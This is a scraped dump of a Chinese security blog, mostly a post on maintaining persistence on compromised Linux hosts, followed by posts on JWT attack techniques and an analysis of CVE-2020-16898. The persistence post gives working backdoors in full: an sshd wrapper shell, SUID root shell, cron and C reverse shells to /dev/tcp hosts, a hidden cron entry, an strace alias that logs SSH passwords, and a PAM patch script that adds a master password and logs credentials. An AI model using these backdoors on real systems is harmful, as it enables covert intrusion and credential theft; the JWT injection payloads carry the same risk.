\u003e\u003e\u003e import struct \u003e\u003e\u003e buffer = struct.pack('\u003eI6',19256) \u003e\u003e\u003e print repr(buffer) '\\x00\\x00LF' \u003e\u003e\u003e buffer = struct.pack('\u003eI6',13377) \u003e\u003e\u003e print buffer 4A 原理简单说明：init首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell 简单点就是从sshd程序fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行判断。 排查方法： ls -al /usr/sbin/sshd cat /usr/sbin/sshd 如果想彻底恢复的话，需要进行ssh服务的重装。 4. ssh的隐身登录 在进行ssh登录时可以使用以下命令实现隐身登录，避免被last\\who\\w等指令检测到。 # 不被last\\who\\w等指令检测 ssh -T username@x.x.x.x /bin/bash -i # 不记录ssh公钥在本地.ssh目录中 ssh -o UserKnownHostFile=/dev/null -T user@x.x.x.x /bin/bash -if ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:3","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"3. SUID Shell 需要配合普通用户进行使用。root权限下执行如下命令，普通用户运行/dev/.rootshell即可获得root权限： cp /bin/bash /dev/.rootshell chmod u+s /dev/.rootshell 备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。该方法个人认为较为鸡肋，且bash版本现在较高，可利用性不高。 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:4","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"4. crontab后门（文件落地） crontab命令用于设置周期性被执行的指令，可以利用该命令新建shell脚本，利用脚本进行反弹。 Step 1 ：创建shell脚本，例如在/etc/evil.sh #!/bin/bash bash -i \u003e\u0026 /dev/tcp/192.168.160.154/12345 0\u003e\u00261 并给脚本赋予相应权限： chmod +sx /etc/evil.sh Step 2：设置定时服务 crontab -e 输入以下内容： # exec per min */1 * * * * root /etc/evil.sh 重启crond服务，service crond restart，然后使用nc接收shell。 上述方法在实际测试中成功了率较低，建议使用一句话后门： (crontab -l;printf \"*/1 * * * * /tmp/crontab_backdoor.sh;\\rno crontab for `whoami`%100c\\n\")|crontab - 这种方式成功率更高，而且不易被crontab -l发现。 其中关于crondtab的详细原理可以参考：https://cloud.tencent.com/developer/article/1683265 排查手段： # 查看可以的定时任务列表 crontab -e ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:5","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"5. alias欺骗（文件落地） 可以通过alias命令来执行特定的命令时静默运行其他程序，从而达到启动后门，记录键值等作用。2个实例： 修改ssh命令，利用strace，使其具有记录ssh对read、write、connect调用的功能： alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s2048 ssh' 利用守护进程回弹shell alias cat='cat\u0026\u0026/root/.shell' 回弹shell的c语言版脚本： // shell.c #include \u003cstdio.h\u003e#include \u003cunistd.h\u003e#include \u003cstdlib.h\u003e#include \u003ctime.h\u003e#include \u003cfcntl.h\u003e#include \u003cstring.h\u003e#include \u003csys/stat.h\u003e#include \u003csignal.h\u003e #define ERR_EXIT(m) do { perror(m); exit(EXIT_FAILURE); } while (0); void creat_daemon(void); int main(void) { time_t t; int fd; creat_daemon(); // 将ip和端口进行替换 system(\"bash -i \u003e\u0026 /dev/tcp/192.168.80.147/12345 0\u003e\u00261\"); return 0; } void creat_daemon(void) { pid_t pid; int devnullfd,fd,fdtablesize; umask(0); pid = fork(); if( pid == -1) ERR_EXIT(\"fork error\"); if(pid \u003e 0 ) exit(EXIT_SUCCESS); if(setsid() == -1) ERR_EXIT(\"SETSID ERROR\"); chdir(\"/\"); /* close any open file descriptors */ for(fd = 0, fdtablesize = getdtablesize(); fd \u003c fdtablesize; fd++) close(fd); devnullfd = open(\"/dev/null\", 0); /* make STDIN ,STDOUT and STDERR point to /dev/null */ if (devnullfd == -1) { ERR_EXIT(\"can't open /dev/null\"); } if (dup2(devnullfd, STDIN_FILENO) == -1) { ERR_EXIT(\"can't dup2 /dev/null to STDIN_FILENO\"); } if (dup2(devnullfd, STDOUT_FILENO) == -1) { ERR_EXIT(\"can't dup2 /dev/null to STDOUT_FILENO\"); } if (dup2(devnullfd, STDERR_FILENO) == -1) { ERR_EXIT(\"can't dup2 /dev/null to STDOUT_FILENO\"); } signal(SIGCHLD,SIG_IGN); return; } 使用nc监听回弹的shell。 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:6","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"6. Linux PAM密码记录后门（文件落地） PAM(Pluggable Authentication Modules)，是由Sun提出的一种认证机制。它通过一共一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的账号密码。其大致流程如下： 获取目标系统所使用的PAM版本，下载对应版本的pam版本 解压缩，修改pam_unix_auth.c文件，添加万能密码 编译安装PAM 编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。 一个自动化脚本如下： #!/bin/bash ## ##查看版本: ##redhat yum list pam ##debian\u0026Ubuntu dpkg -s libpam-modules | grep -i version | cut -d' ' -f2 ## PASS='test123' ##...... LOG='\\/bin\\/.sshlog' ##...... echo \" .___ ___. ___ ___ _______ ____ ____ | \\/ | / _ \\ / _ \\ | \\ \\ \\ / / | \\ / | | | | | | | | | | .--. | \\ \\/ / | |\\/| | | | | | | | | | | | | | \\_ _/ | | | | | |_| | | |_| | | '--' | | | |__| |__| \\___/ \\___/ |_______/ |__| \" echo -e \"\\nPam-Backdoor\\n{code this shit while learning pam}\\n\\n\" oldtime=`stat -c '%z' /lib/security/pam_ftp.so` echo 'Pam backdoor starting!' mirror_url='http://www.linux-pam.org/library/Linux-PAM-1.1.1.tar.gz' #mirror_url='http://yum.singlehop.com/pub/linux/libs/pam/pre/library/Linux-PAM-0.99.6.2.tar.gz'，修改为对应的pam版本 echo 'Fetching from '$mirror_url wget $mirror_url #fetch the roll tar zxf Linux-PAM-1.1.1.tar.gz #untar,修改为对应的pam版本 cd Linux-PAM-1.1.1 #find and replace sed -i -e 's/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\\n\\tif (strcmp(p,\"'$PASS'\")==0 ){retval = PAM_SUCCESS;}if(retval == PAM_SUCCESS){\\n\\tFILE * fp;\\n\\tfp = fopen(\"'$LOG'\", \"a\");\\n\\tfprintf(fp, \"%s : %s\\\\n\", name, p);\\n\\tfclose(fp);\\n\\t}/g' modules/pam_unix/pam_unix_auth.c DIS=`head /etc/issue -n 1|awk '{print $1}'` #get the version if [ $DIS = \"CentOS\" ];then ./configure --disable-selinux \u0026\u0026 make else ./configure \u0026\u0026 make fi #copy modified pam_unix.so if [ `uname -p` = 'x86_64' ];then LIBPATH=lib64 else LIBPATH=lib fi /bin/cp -rf /$LIBPATH/security/pam_unix.so /$LIBPATH/security/pam_unix.so.bak #.. ......... /bin/cp -rf modules/pam_unix/.libs/pam_unix.so /$LIBPATH/security/pam_unix.so touch -d \"$oldtime\" /lib/security/pam_unix.so cd .. \u0026\u0026 rm -rf Linux-PAM-1.1.1* echo \"Done bro..\" 可以根据需要将下载pam部分修改为上传本地下载好的pam，这样可以避免目标主机无法访问对应链接地址时造成的文件下载失败。 Linux PAM版本地址：http://www.linux-pam.org/library/ 详细情况可参考https://blog.51cto.com/redkey/1343316 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:7","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"5. PROMPT_COMMAND后门 bash提供来一个环境变量PROMPT_COMMAND，这个变量会在执行命令前执行一遍。 export PROMPT_COMMAND=\"lsof -i:1025 \u0026\u003e/dev/null || (python -c \"exec('encoded_payload'.decode('base64'))\" 2\u003e/dev/null \u0026)\" 也可以使用该变量进行提权：https://www.anquanke.com/post/id/155943 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:8","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"7. Rootkit 根据搜索情况来看，一般水平的rootkit很容易将系统环境搞崩，而高质量的Rootkit不太容易找，因此如非迫不得已，不是很建议直接使用这种方法。如果能单独进行定制，是另外一种情况。这里暂时先给出一个收集的rootkit库：https://github.com/d30sa1/RootKits-List-Download ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:2:9","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Tech"],"content":"参考文献 https://wiki.bash-hackers.org/howto/redirection_tutorial https://www.gnu.org/software/bash/manual/html_node/Redirections.html https://brucetg.github.io/2018/05/03/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/ https://www.anquanke.com/post/id/171891#h2-15 https://bypass007.github.io/Emergency-Response-Notes/privilege/%E7%AC%AC4%E7%AF%87%EF%BC%9ALinux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81--%E5%90%8E%E9%97%A8%E7%AF%87.html https://www.anquanke.com/post/id/155943#h2-9 ","date":"2020-12-13","objectID":"/2020/12/Backdoor/:3:0","tags":["Security"],"title":"Linux下的权限维持","uri":"/2020/12/Backdoor/"},{"categories":["Vuln"],"content":"简述JWT认证，并简单总结其攻击界面","date":"2020-11-19","objectID":"/2020/11/JWT/","tags":["Security"],"title":"JWT认证和攻击界面简单总结","uri":"/2020/11/JWT/"},{"categories":["Vuln"],"content":"JWT认证和攻击界面简单总结 ","date":"2020-11-19","objectID":"/2020/11/JWT/:0:0","tags":["Security"],"title":"JWT认证和攻击界面简单总结","uri":"/2020/11/JWT/"},{"categories":["Vuln"],"content":"JWT简述 Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。 ","date":"2020-11-19","objectID":"/2020/11/JWT/:1:0","tags":["Security"],"title":"JWT认证和攻击界面简单总结","uri":"/2020/11/JWT/"},{"categories":["Vuln"],"content":"JWT认证和session认证的区别 1. session认证 http协议是一种无状态的协议，即其对事务处理没有记忆能力，不对请求和响应之间的通信状态进行保存。如果用户向应用提供了用户名和密码来进行用户认证，那么在进行下一次请求时，需要再次进行用户认证。因为使用http协议并不能明确是哪个用户发送的请求。 为了实现应用可以识别出发出请求的用户，需要在server上存储一份用户登录的信息，这份登录信息会在server响应时传递给client，告诉其保存为cookie，以便下次请求时发送给应用。这样，就可以识别出发出请求的用户。以上即为传统的基于session的认证。 Cookie的传递过程 浏览器向URL发送请求 server生成response 在响应头中加入Set-Cookie字段，值为要设置的Cookie 浏览器接受到response 浏览器在响应头中搜索Set-Cookie字段，并将值保存在内存或硬盘中 当下一次向该server发送http请求时，将server设置的Cookie附加在http请求的字段Cookie中 server收到请求，发现头部有Cookie字段，则明确已处理过该用户的请求 过期的Cookie会被删除 基于Cookie—Session的验证过程 用户输入登录信息 server验证信息是否正确，如果正确就为该用户创建一个Session，并把Session存入数据库 server向client返回带有sessionID的Cookie client接收到server返回的响应，发现头部有Set-Cookie字段，将Cookie进行保存 后续client的请求都会附带该Cookie，server将sessionID与数据库中的做匹配，如果一直则处理该请求 用户登出，Session会在client和server都被销毁 Cookie-Session机制的缺陷 跨域问题，Cookie属于同源策略限制的内容之一 Session保存在server，容易遭受DoS攻击 扩展性低，多台server较难实现Session共享 安全性低，attacker可以利用本地Cookie进行欺骗和CSRF攻击 2. JWT认证 基于Token的鉴权机制也是无状态的，但它不徐奥server存储用户的认证信息或会话信息。 JWT组成 JWT由3部分组成：header、payload、signature，每个部分中间使用.进行分隔，其中，header和payload使用Base64URL进行编码，即： base64UrlEncode(header).base64UrlEncode(payload).signature header部分是一个JSON对象，用来描述JWT的元数据： { \"typ\": \"JWT\", // 表示对象是一个 JWT \"alg\": \"HS256\" // 表示使用哪种 Hash 算法来创建签名，这里是 HMAC-SHA256 } payload部分也是一个JSON对象，存储实际需要传递的数据，其内容可以是官方定义的7个字段，也可以是自定义的私有字段： { \"sub\": \"title\", \"iat\": 1605688497, \"exp\": 9999999999, \"name\": \"V4ler1an\" } JWT默认不进行加密，所以该部分不要存放关键信息。 signature是对前2部分的签名，防止数据被篡改。这里需要传入一个key作为加密的私钥： key = \"secret\" data = base64urlEncode(header) + \".\" + base64urlEncode(payload); signature = HMAC-SHA256(key，data); 一个样例JWT如下： JWT认证流程 用户使用账号和密码发出post请求 server使用私钥创建一个JWT，并返回给浏览器 浏览器将该JWT串放在请求头的Authorization中: Authorization: Bearer \u003ctoken\u003e, 发送给server server对JWT进行验证 验证通过后返回相应的资源给浏览器 用户登出，client删除token，server不做处理 JWT缺陷 默认不加密 只验证来源可靠性，并不对数据进行保护，也不会防止未授权访问。只要获取到token，任意用户都可以通过验证。为减少盗用，JWT的有效期应该设置尽可能短 Token过期问题，因为server不保存Session状态，所以无法在使用过程中废止或更改权限。即JWT一旦签发，到期前会始终有效。 JWT攻击界面 爆破私钥key。如果signature的加密私钥key为已知，理论上来说可以通过爆破获得，且已有爆破工具可以直接使用 修改算法， 将非对称加密算法修改为对称加密算法。HS256使用私密密钥对每条消息进行签名和验证，这也是JWT默认使用的算法，RS256使用私钥对消息进行签名，并使用公钥进行验证。可以将算法RS256更改为HS256，后端代码会使用公钥作为私密密钥，然后使用HS256验证签名。即想办法获取到RS256的公钥，然后修改算法为HS256，然后使用RSA公钥对数据签名，后端代码使用RSA公钥+HS256算法签名，从而实现绕过。 修改算法为none，即将header中的alg字段修改为none。这种方式只适合一些低版本的JWT库。当设置为none时表示没有签名算法，后端不会进行签名校验，此时去掉JWT的signature数据，然后直接提交给服务端即可。 修改KID参数。kid是header中的一个可选参数，全称key ID，用于指定加密算法的密钥： { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"/home/jwt/.ssh/pem\" } 该参数可以由用户输入。常见的有以下几种攻击方式： 任意文件读取 kid参数用于读取密钥文件，但系统并不知道用户想要读取的是否是密钥文件。所以，如果没有对参数进行过滤，那么攻击折可以读取到系统的任意文件。 { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"/etc/passwd\" } SQL注入 kid也可以从数据库中提取数据，此时有可能造成SQL攻击，通过构造SQL语句来获取数据或绕过signature的验证。 { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"key111111' || union select 'secretkey' -- \" } 命令注入 利用条件苛刻。ruby语言需要使用open函数读取密钥文件，可以命令注入。 \"/path/to/key_file|whoami\" 如果是php语言，则需要使用exec或system函数读取密钥文件，可能性较小。 信息泄露。由于JWT的初衷并不是保证传输数据的机密性，所以payload是直接使用base64url编码的。如果在payload中携带了敏感信息，可以直接进行base64url解码，从而读取到payload中的关键信息。 ","date":"2020-11-19","objectID":"/2020/11/JWT/:1:1","tags":["Security"],"title":"JWT认证和攻击界面简单总结","uri":"/2020/11/JWT/"},{"categories":["Vuln"],"content":"简单分析CVE-2020-16898","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"CVE-2020-16898 “Bad Neighbor \" Windows TCP/IP远程代码执行漏洞分析 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:0:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"一、漏洞信息 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:1:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"1. 漏洞简述 漏洞名称：Windows TCP/IP Remote Code Execution Vulnerability 漏洞编号：CVE-2020-16898 漏洞类型：Design Weakness 漏洞影响：Code Execution CVSS评分：9.8 利用难度：Medium 基础权限：不需要 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:1:1","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"2. 组件概述 TCP/IP是Internet上使用的通信协议。 在Windows的早期版本中，TCP/IP是一个单独的可选组件，可以像其他任何协议一样删除或添加。从Windows XP/Server 2003开始，TCP/IP成为操作系统的核心组件，无法删除。 将TCP/IP作为Windows的核心组件是非常有意义的，因为它的功能在Microsoft Windows Server上对网络操作和Active Directory域环境尤为重要。 整个Active Directory架构基于DNS层次结构，依赖于TCP/IP 传输协议 。 Microsoft Windows中的TCP/IP功能在内核级别运行，并由驱动程序tcpip.sys提供。该驱动程序处理所有传入和传出的TCP/IP通信信息，包括解析从网络接口接收到的数据包，以及解释此数据并将其传递给更高级别的组件。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:1:2","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"3. 漏洞利用 该漏洞主要是由于Windows TCP/IP堆栈在处理选项类型为25(0x19，递归DNS服务器选项)且长度字段值为偶数的ICMPv6的路由广播数据包时，处理逻辑存在纰漏，导致存在远程代码执行漏洞。成功利用该漏洞的攻击者可以在目标机器（主机或服务器）上执行任意代码。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:1:3","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"4. 漏洞影响 • Microsoft Windows 10 1709 • Microsoft Windows 10 1803 • Microsoft Windows 10 1809 • Microsoft Windows 10 1903 • Microsoft Windows 10 1909 • Microsoft Windows 10 2004 • Microsoft Windows Server 2019 • Microsoft Windows Server, version 1903 • Microsoft Windows Server, version 1909 • Microsoft Windows Server, version 2004 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:1:4","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"5. 解决方案 微软官方针对该漏洞已发布安全更新补丁，补丁地址： https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:1:5","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"二、漏洞复现 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:2:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"1. 环境搭建 靶机：Windows 10 1809 x64 靶机操作：无需任何操作，可正常与攻击机通信即可 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:2:1","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"2. 复现过程 通过各种手段获取目标主机的IPv6地址和MAC地址（具体方法可自行探索，较为简单） 攻击机python3运行poc： 靶机crash： ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:2:2","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"三、漏洞分析 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:3:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"1. 基本信息 漏洞文件：tcpip.sys 漏洞函数： Ipv6pUpdateRDNSS()函数 漏洞对象：ICMPv6路由广播中的option结构 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:3:1","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"2. 背景知识 (限于篇幅问题，此处不对用于DNS配置的IPv6路由广播进行详细介绍，更详细资料可参考RFC8106) 1. 基本知识 IPv6 Router Advertisment (RA) options，也称为DNS RA options，允许IPv6的路由器向IPv6的主机广播DNS Recursive Server Address(DNS递归路由器地址)列表和DNS Search List（DNS搜索列表），其主要用途为在IPv6的主机上进行DNS名称解析以及域后缀的处理。 IPv6 Neighbor Discovery(ND，IPv6邻居发现)和IPv6 Stateless Address Autoconfiguratioin(SLAAC，IPv6无状态地址自动配置)提供了使用一个或多个IPv6地址，默认路由器以及一些其他参数配置固定节点或移动节点的方法。 当漫游主机每次连接到另一个网络时，无法进行手动配置。 虽然可以进行静态配置，但是在诸如笔记本电脑之类的通用主机上通常不建议这样操作。 例如，如果主机运行直接连接到全局DNS的自己的递归名称服务器，那么本地定义的名称空间对主机来说就不可用了。 访问DNS是几乎所有主机的基本要求，因此IPv6 SLAAC在没有任何DNS配置支持的情况下，不能在任何实际的网络环境中单独作为替代部署模型。 对于IPv4环境中的DNS服务器来说，这些问题都很容易解决。但是对于IPv6的网络环境，这些问题显得比较棘手。因此，RFC8106定义了一种基于DNS RA选项的机制，以允许IPv6主机执行自动DNS配置。 在通过IPv6 SLAAC自动配置IPv6主机地址并且没有DHCPv6基础结构或一些主机没有DHCPv6客户端的网络环境中，可以使用基于RA的DNS配置作为替代。 但是，对于需要分发其他信息的网络，可能仍然会使用DHCPv6。 在这些网络中，可能不需要基于RA的DNS配置。 基于RA的DNS配置允许IPv6主机获取主机连接到的链接的DNS配置（即DNS递归服务器地址和DNSSL）。 此外，主机会从提供链接配置信息的同一RA消息中学习此DNS配置。 2. 名词解释 Recursive DNS Server (RDNSS)：递归DNS服务器，提供递归DNS解析服务的服务器，用于将域名转换为IP地址或解析成RFC1034和RFC1035中定义的PTR记录。 RDNSS Option：一个用于向IPv6主机传送RDNSS信息的IPv6的RA option【RFC4861】。 DNS Search List (DNSSL)：Pv6主机在执行DNS查询搜索时使用的DNS后缀域名列表，用于搜索简短的不合格域名。 DNSSL Option：一个IPv6 RA选项，用于将DNSSL信息传递到IPv6主机。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:3:2","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows TCP/IP远程代码执行漏洞分析","uri":"/2020/10/CVE-2020-16898/"},{"categories":["Vuln"],"content":"3. 详细分析 1. 基础分析 RFC8106标准化了RDNSS option，其中包含RDNSSes的地址。该信息使用现有ND message(例如RA)作为载体。IPv6主机可以通过RA消息配置一个或多个RDNSS的IPv6地址。 1. 邻居发现扩展 RFC8106中定义的在邻居发现中使用的IPv6 DNS配置算法需要用到2种ND options：RDNSS option和DNSSL option。与该漏洞相关的是RDNSS option，另外一种则与 CVE-2020-16899相关。 2. RDNSS Option Structure RDNSS option总体结构如下： Offset Size(bytes) Field Descriptioin 0x00 1 Type 8-bit，RDNSS option type identifier，0x19 0x01 1 Length option长度（包括\"Type\"和\"Length\"字段），以8个八位位组为单位。 0x02 2 Reserved 保留字段 0x04 4 Lifetime RDNSS地址可用于名称解析的最长时间（以秒为单位）（相对于接收包的时间）。默认情况下，该值至少为3 * MaxRtrAdvInterval，其中MaxRtrAdvInterval是RFC4861中定义的最大RA间隔。 0xffffffff表示无穷大， 零值意味着必须不再使用RDNSS地址。 0x08 16 Address of IPv6 Recursive DNS Servers 一个或多个128位IPv6地址。 地址的数量由Length字段确定：Number of addresses = (Length - 1) / 2。 对于Length字段，如果该选项中仅包含一个IPv6地址，则最小值为3。 每增加一个RDNSS地址，长度就会增加2。接收的主机使用该字段来确定选项中IPv6地址的数量。 3. Procedure in IPv6 Hosts 当主机接收到RA消息中的DNS的options时，其处理过程如下： 首先检查Lengh字段的合法性：是否大于等于最小值3，以及是否满足(Length - 1) % 2 == 0； 对于RDNSS option，还会检查Address字段是否为一个单播地址； 如果以上验证通过，则主机应按顺序将选项的值复制到DNS存储库和解析器存储库中。 否则，主机必须丢弃这些选项。 4. Crash分析 首先分析dmp文件，查看crash现场： 并没有发现明显的较为有价值的Call Stack信息，但是发现最终的crash原因的是GS机制的Security Cookie校验失败，也就是说该值被覆盖掉了。那么很有可能是一个溢出。除此之外，只发现了tcpip!Ipv6pHandleRouterAdvertisement+0x1269函数，再往后就直接报gsfailure了。 2. 静态分析 分析使用的文件为Windows 10 1809 x64的tcpip.sys文件，版本为10.0.17763.316。 1. 函数调用链 根据crash现场信息，获取到关键函数tcpip!Ipv6pHandleRouterAdvertisement()，首先确认该函数到漏洞函数的前后调用链。 首先查看其交叉引用关系： 其上层调用函数为Icmpv6ReceiveDatagrams()，跟进，并查看交叉引用关系： 没有再发现显式的函数调用。转而向tcpip!Ipv6pHandleRouterAdvertisement()的下层搜索： 发现漏洞函数调用。至此，函数调用链可以简单概括为： Icmpv6ReceiveDatagrams() -\u003e tcpip!Ipv6pHandleRouterAdvertisement() -\u003e Ipv6pUpdateRDNSS() 2. 漏洞函数分析 经过简单分析可以明确，调用链的顶层函数Icmpv6ReceiveDatagrams()没有发现实质性的与该漏洞相关的处理代码，而在tcpip!Ipv6pHandleRouterAdvertisement() 函数中发现了对漏洞函数Ipv6pUpdateRDNSS()的调用。根据crash分析，最后报了gsfailure，而且关键函数为tcpip!Ipv6pHandleRouterAdvertisement()，在该函数的起始位置确实发现了GS校验： 那么很有可能是在漏洞函数Ipv6pUpdateRDNSS()中发生了溢出，导致了其调用函数tcpip!Ipv6pHandleRouterAdvertisement()的GS校验失败。 进入漏洞函数Ipv6pUpdateRDNSS()： NdisGetDataBuffer()函数声明如下： PVOID NdisGetDataBuffer( PNET_BUFFER NetBuffer, // [in], a pointer to a NetBuffer structure ULONG BytesNeeded, // [in], the number of contiguous bytes of data requested PVOID Storage, // [in, optional], a pointer to a buffer, or NULL if no buffer is provided by the caller. The buffer must be greater than or equal in size to the number of bytes specified in BytesNeeded . If this value is non-NULL, and the data requested is not contiguous, NDIS copies the requested data to the area indicated by Storage . UINT AlignMultiple, // [in], the alignment multiple expressed in power of two. For example, 2, 4, 8, 16, and so forth. If AlignMultiple is 1, then there is no alignment requirement. UINT AlignOffset // [in], the offset, in bytes, from the alignment multiple. ); // Return Value A pointer to the start of the contiguous data or NULL. 如果NetBuffer参数指向的NET_BUFFER结构中的NET_BUFFER_DATA部分的DataLength字段的值小于BytesNeeded参数的值，那么函数返回NULL。NET_BUFFER的结构如下： typedef struct _NET_BUFFER { union { struct { PNET_BUFFER Next; PMDL CurrentMdl; ULONG CurrentMdlOffset; union { ULONG DataLength; SIZE_T stDataLength; }; PMDL MdlChain; ULONG DataOffset; }; SLIST_HEADER Link; NET_BUFFER_HEADER NetBufferHeader; }; USHORT ChecksumBias; USHORT Reserved; NDIS_HANDLE NdisPoolHandle; PVOID NdisReserved[2]; PVOID ProtocolReserved[6]; PVOID MiniportReserved[4]; NDIS_PHYSICAL_ADDRESS DataPhysicalAddress; union { PNET_BUFFER_SHARED_MEMORY SharedMemoryInfo; PSCATTER_GATHER_LIST ScatterGatherList; }; } NET_BUFFER, *PNET_BUFFER; 首先获取到RDNSS option结构，然后读取Length字段来计算Address字段有几个Address值。 确认有多少Address之后，进入循环，对每个Address进行处理。这里还有一个判断，如果不是单播地址，直接忽略： 在上面的处理过程中，存在一个问题：假设Length的长度为4，那么计算结束之后，AddressCount的值应该为1。此时，按照正常逻辑，Ipv6pUpdateRDNSS()函数应该增加32字节（4*8）的缓冲区，但是后续在分配缓冲区时只分配了24字节：sizeof(ND_OPTION_RDNSS) + sizeof(IN6_ADDR) = 8 + 16 = 24，从而导致了缓冲区的溢出。 根据RFC8106的标准，Length字段的值应该满足最小为3的奇数的情况。当提供一个偶数Length值时，Windows TCP/IP堆栈错误地将buffer前进了8个字节。这主要是因为堆栈在内部以16字节为增量进行计数，并且没有使用非RFC兼容长度值的处理代码。这种不匹配导致堆栈将当前选项的最后8个字节解释为第二个选项的开始，最终导致","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16898/:3:3","tags":["Security","Vulnerability"],"title":"CVE-2020-16898 Bad Neighbor Windows 